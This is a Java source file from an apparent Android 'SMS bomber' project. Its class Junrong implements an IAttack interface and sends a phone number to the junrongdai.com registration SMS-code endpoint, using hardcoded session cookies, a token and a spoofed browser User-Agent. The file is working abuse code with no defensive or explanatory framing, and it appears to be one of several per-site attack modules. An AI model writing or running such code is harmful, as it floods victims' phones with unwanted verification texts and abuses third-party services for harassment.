package com.example.wudi.sms.sites;

import android.util.Log;

import com.example.wudi.sms.MainApplication;
import com.example.wudi.sms.Utils;
import com.squareup.okhttp.Callback;
import com.squareup.okhttp.MediaType;
import com.squareup.okhttp.OkHttpClient;
import com.squareup.okhttp.Request;
import com.squareup.okhttp.RequestBody;
import com.squareup.okhttp.Response;

import java.io.IOException;
import java.util.concurrent.TimeUnit;

/**
 * Created by wudi on 12/16/2015.
 */
public class Junrong implements IAttack {
    @Override
    public void attack() {
        final MediaType text = MediaType.parse("application/x-www-form-urlencoded; charset=UTF-8");

        OkHttpClient client = new OkHttpClient();
        client.setConnectTimeout(5000, TimeUnit.MILLISECONDS);
        client.setReadTimeout(5000, TimeUnit.MILLISECONDS);
        client.setWriteTimeout(5000, TimeUnit.MILLISECONDS);

        Request request = new Request.Builder()
                .url("https://www.junrongdai.com/UserAction-getMobileCodeByRegister.action?Id=" + Utils.getNumber(MainApplication.context) + "&lockCode=&appkey=0003&token=00031450259415202693454926411450259415202702&scene=getcaptcha&timstamp=1450259427793")
                .get()
                .addHeader("Cookie", "JSESSIONID=AEAAC70BD1A95E52D7017DEE46977E6B; SERVERID=de1f1b59c44d9bdf4dd6d2b949923efd|1450259421|1450259414; Hm_lvt_d08fc84015a605cbee077be320058f91=1450259416; Hm_lpvt_d08fc84015a605cbee077be320058f91=1450259416; utm_source=baidu_jr; utm_medium=baidujr; utm_term=yageer; _ga=GA1.2.1743334724.1450259416; _gat=1; ag_fid=Rze96e7MRJOS8wJF")
                .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586")
                .addHeader("Accept-Encoding", "gzip, deflate")
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Request request, IOException e) {
                Log.d("hello", e.getMessage());
            }

            @Override
            public void onResponse(Response response) throws IOException {
                response.body().close();
            }
        });
    }
}
